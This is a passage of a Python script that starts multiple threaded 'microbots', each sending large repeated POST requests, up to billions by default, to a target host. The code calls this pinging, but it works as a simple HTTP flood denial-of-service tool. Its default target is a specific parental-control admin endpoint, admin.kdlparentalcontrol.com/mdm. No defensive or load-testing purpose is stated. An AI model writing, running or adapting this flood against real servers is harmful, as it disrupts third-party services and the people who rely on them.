    Args:
        host (str): The server or domain to ping (e.g., "34.120.115.37" or "https://example.com").
        count (int): Number of requests to send (default is 100000000000).
        packet_size (int): Size of the packet to simulate (in bytes).
        bot_id (int): The ID for this microbot.
    Returns:
        None
    """
    # Check if the host is valid
    if not is_valid_ip_or_url(host):
        print(f"Bot-{bot_id}: Invalid host provided: {host}")
        return

    # Ensure the host starts with HTTP/HTTPS for URLs
    if not host.startswith("http://") and not host.startswith("https://"):
        host = f"http://{host}"

    # Creating a data payload of the specified size
    payload = "a" * packet_size  # 'a' character repeated to create the payload of desired size

    try:
        print(f"Bot-{bot_id}: Pinging {host} with packet size {packet_size} bytes...")

        for i in range(count):
            # Using POST to send a payload (simulate larger packets)
            response = requests.post(host, data=payload)
            if response.status_code == 200:
                print(f"Bot-{bot_id}: {host} is reachable (status code: {response.status_code})")
            else:
                print(f"Bot-{bot_id}: {host} returned an error (status code: {response.status_code})")
            
            time.sleep(1)  # Optional: Adds a delay between pings

        print(f"Bot-{bot_id}: Completed pings to {host}\n")

    except requests.exceptions.RequestException as e:
        print(f"Bot-{bot_id}: An error occurred: {e}")

def start_microbots(num_bots, host="https://admin.kdlparentalcontrol.com/mdm", ping_interval=0.1, packet_size=65500):
    """
    Starts the specified number of microbots, each pinging the server.
    Args:
        num_bots (int): Number of microbots to start.
        host (str): The server or domain to ping.
        ping_interval (float): Interval between each ping request.
        packet_size (int): Size of the packets to simulate (in bytes).
    Returns:
        None
    """
    if not is_valid_ip_or_url(host):
        print(f"Error: Invalid host provided: {host}")
        return

    threads = []
    for i in range(num_bots):
        # Create a new thread for each microbot
        thread = threading.Thread(target=ping_server, args=(host, 99999, packet_size, i + 1))
        threads.append(thread)
        thread.start()
        time.sleep(ping_interval)  # Pause between starting threads (optional)
    
    # Wait for all threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    num_bots = 10   # Set the number of microbots to spawn (reduced to 10 for practicality)
    server = "https://example.com"  # Set the domain or IP you want to ping (e.g., "google.com" or "34.120.115.37")
    ping_interval = 0.1  # Seconds between starting each microbot
    packet_size = 65500  # Adjust the packet size to 65500 bytes (can change this value)

    # Start the microbots with adjustable packet size
    start_microbots(num_bots, server, ping_interval, packet_size)
